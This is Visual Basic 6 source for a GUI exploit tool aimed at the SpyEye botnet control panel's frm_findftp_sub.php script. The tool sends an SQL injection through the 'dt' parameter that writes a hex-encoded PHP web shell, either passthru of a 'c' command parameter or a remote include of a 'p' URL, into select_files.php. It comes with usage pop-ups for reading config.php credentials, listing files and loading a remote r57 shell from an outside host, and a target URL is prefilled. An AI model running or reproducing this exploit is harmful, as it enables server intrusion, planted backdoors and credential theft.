VERSION 5.00
Object = "{EAB22AC0-30C1-11CF-A7EB-0000C05BAE0B}#1.1#0"; "shdocvw.dll"
Begin VB.Form Form1 
   BorderStyle     =   1  'Fixed Single
   Caption         =   "SpyEye v1.3 bug exploiter (frm_findftp_sub.php) - xylitol@malwareint.com"
   ClientHeight    =   4215
   ClientLeft      =   45
   ClientTop       =   330
   ClientWidth     =   7215
   LinkTopic       =   "Form1"
   MaxButton       =   0   'False
   MinButton       =   0   'False
   ScaleHeight     =   4215
   ScaleWidth      =   7215
   StartUpPosition =   3  'Windows Default
   Begin VB.Frame Frame1 
      Caption         =   "?dt="
      Height          =   975
      Left            =   3960
      TabIndex        =   13
      Top             =   480
      Width           =   3135
      Begin VB.TextBox Text3 
         Height          =   285
         Left            =   480
         MaxLength       =   8
         TabIndex        =   16
         Top             =   530
         Width           =   1335
      End
      Begin VB.OptionButton Option5 
         Height          =   255
         Left            =   240
         TabIndex        =   15
         Top             =   530
         Width           =   255
      End
      Begin VB.OptionButton Option4 
         Caption         =   "Option4"
         Height          =   195
         Left            =   240
         TabIndex        =   14
         Top             =   300
         Value           =   -1  'True
         Width           =   2655
      End
   End
   Begin VB.CommandButton Command1 
      Caption         =   "?"
      Height          =   255
      Left            =   3360
      TabIndex        =   12
      Top             =   1200
      Width           =   375
   End
   Begin VB.TextBox Text2 
      Height          =   2055
      Left            =   7560
      Locked          =   -1  'True
      MultiLine       =   -1  'True
      ScrollBars      =   3  'Both
      TabIndex        =   11
      Text            =   "lame.frx":0000
      Top             =   1560
      Visible         =   0   'False
      Width           =   5535
   End
   Begin VB.OptionButton Option3 
      Caption         =   "Custom"
      Height          =   255
      Left            =   120
      TabIndex        =   10
      Top             =   1200
      Width           =   3135
   End
   Begin VB.TextBox Text1 
      Height          =   2055
      Left            =   120
      MaxLength       =   960
      MultiLine       =   -1  'True
      ScrollBars      =   3  'Both
      TabIndex        =   9
      Text            =   "lame.frx":0045
      Top             =   1560
      Width           =   6975
   End
   Begin VB.CommandButton Command6 
      Caption         =   "Check"
      Height          =   375
      Left            =   3720
      TabIndex        =   7
      Top             =   3720
      Width           =   3375
   End
   Begin VB.CommandButton Command5 
      Caption         =   "Spl0it"
      Height          =   375
      Left            =   120
      TabIndex        =   6
      Top             =   3720
      Width           =   3375
   End
   Begin VB.CommandButton Command3 
      Caption         =   "?"
      Height          =   255
      Left            =   3360
      TabIndex        =   5
      Top             =   840
      Width           =   375
   End
   Begin VB.CommandButton Command2 
      Caption         =   "?"
      Height          =   255
      Left            =   3360
      TabIndex        =   4
      Top             =   480
      Width           =   375
   End
   Begin VB.TextBox Text4 
      Height          =   285
      Left            =   720
      TabIndex        =   2
      Text            =   "http://fullhousevscare.com/frmcp0/"
      Top             =   120
      Width           =   6375
   End
   Begin VB.OptionButton Option2 
      Caption         =   "<?php include($_GET['p']);?>"
      Height          =   255
      Left            =   120
      TabIndex        =   1
      Top             =   840
      Width           =   3135
   End
   Begin VB.OptionButton Option1 
      Caption         =   "<?php $o=passthru($_GET['c']);?>"
      Height          =   255
      Left            =   120
      TabIndex        =   0
      Top             =   480
      Value           =   -1  'True
      Width           =   3135
   End
   Begin SHDocVwCtl.WebBrowser brwWebBrowser 
      Height          =   3735
      Left            =   9000
      TabIndex        =   8
      Top             =   4320
      Visible         =   0   'False
      Width           =   5400
      ExtentX         =   9525
      ExtentY         =   6588
      ViewMode        =   1
      Offline         =   0
      Silent          =   0
      RegisterAsBrowser=   0
      RegisterAsDropTarget=   0
      AutoArrange     =   -1  'True
      NoClientEdge    =   -1  'True
      AlignLeft       =   0   'False
      NoWebView       =   0   'False
      HideFileNames   =   0   'False
      SingleClick     =   0   'False
      SingleSelection =   0   'False
      NoFolders       =   0   'False
      Transparent     =   0   'False
      ViewID          =   "{0057D0E0-3573-11CF-AE69-08002B2E1262}"
      Location        =   "http:///"
   End
   Begin VB.Image Image2 
      Height          =   225
      Left            =   5880
      Picture         =   "lame.frx":0069
      Top             =   5400
      Width           =   1200
   End
   Begin VB.Label Label1 
      Caption         =   "SYN1:"
      Height          =   255
      Left            =   120
      TabIndex        =   3
      Top             =   120
      Width           =   615
   End
End
Attribute VB_Name = "Form1"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Dim spl0it, random, hexadecimal, auxiliaire As String
Dim n, Datespl0it, i As Integer
Private Declare Function ShellExecute Lib "shell32.dll" Alias "ShellExecuteA" (ByVal hwnd As Long, ByVal lpOperation As String, ByVal lpFile As String, ByVal lpParameters As String, ByVal lpDirectory As String, ByVal nShowCmd As Long) As Long
Option Explicit

Private Sub Command1_Click()
MsgBox "Type your own payload (max: 960 chars)" & vbCrLf & "", vbOKOnly + vbInformation + vbApplicationModal, "Usage"
End Sub

Private Sub Form_Load()
centerform Me
Option4.Caption = Format$(Now, "yyyymmdd")
End Sub

Private Sub Command2_Click()
MsgBox "frmcp0/select_files.php?c=command" & vbCrLf & "Examples:" & vbCrLf & "" & vbCrLf & "frmcp0/select_files.php?c=ls -lia" & vbCrLf & "frmcp0/select_files.php?c=cat ../maincp/client/config.php" & vbCrLf & "" & vbCrLf & "Then just look the source code", vbOKOnly + vbInformation + vbApplicationModal, "Usage"
End Sub

Private Sub Command3_Click()
MsgBox "frmcp0/select_files.php?p=backdoor" & vbCrLf & "Example:" & vbCrLf & "" & vbCrLf & "frmcp0/select_files.php?p=http://goodguys.gov/r57.txt" & vbCrLf & "" & vbCrLf & "Will display a shell", vbOKOnly + vbInformation + vbApplicationModal, "Usage"
End Sub

Private Sub Command5_Click()
On Error GoTo lOlz
Randomize
If Option1.Value = True Then
spl0it = "3c3f70687020246f3d706173737468727528245f4745545b2763275d293b3f3e"
Else
If Option2.Value = True Then
spl0it = "3c3f70687020696e636c75646528245f4745545b2770275d293b3f3e"
Else
If Option3.Value = True Then
spl0it = Text2.Text
Else
End If
End If
End If
If Option4.Value = True Then
Datespl0it = Option4.Caption
Else
If Option5.Value = True Then
Datespl0it = Text3.Text
End If
End If
brwWebBrowser.Navigate Text4.Text & "frm_findftp_sub.php?dt=" & Datespl0it & "%20limit%200%20union%20select%20(select(0x" & spl0it & "))--&lm=0&file=select_files.php&k=1&rnd=0." & Int(Rnd * Format$(Now, "hhmmss") * 31337)
Exit Sub
lOlz:
MsgBox "Prevented a program crash, there is something wrong with the payload" & vbCrLf & "", vbOKOnly + vbCritical + vbApplicationModal, "Error"
End Sub

Public Function HexDump(UneStr As String) As String
For i = 1 To Len(UneStr)
    HexDump = HexDump & Right("00" & Hex(Asc(Mid(UneStr, i, 1))), 2)
Next i
End Function

Private Sub Command6_Click()
If Option1.Value = True Then
ShellExecute hwnd, "Open", Text4.Text & "select_files.php?c=cat config.php", "", App.Path, 1
Else
If Option2.Value = True Then
ShellExecute hwnd, "Open", Text4.Text & "select_files.php?p=http://google.com", "", App.Path, 1
Else
If Option3.Value = True Then
ShellExecute hwnd, "Open", Text4.Text & "select_files.php", "", App.Path, 1
End If
End If
End If
End Sub

 Public Sub centerform(frm As Form) 'center form
 frm.Top = Screen.Height / 2 - frm.Height / 2
 frm.Left = Screen.Width / 2 - frm.Width / 2
 End Sub

Private Sub Text1_Change()
hexadecimal = ""
    For n = 1 To Len(Text1.Text)
        auxiliaire = Mid(Text1.Text, n, 1)              'on charge le carractere traité dans un variable
  hexadecimal = hexadecimal & HexDump(auxiliaire)       'on calcule la valeur hexadecimal grace a la fonction cité au dessus
    Next n
Text2.Text = hexadecimal
End Sub

Private Sub Text3_KeyPress(KeyAscii As Integer)
If (KeyAscii <> vbKeyBack) And Not IsNumeric(Chr(KeyAscii)) Then KeyAscii = 0
End Sub
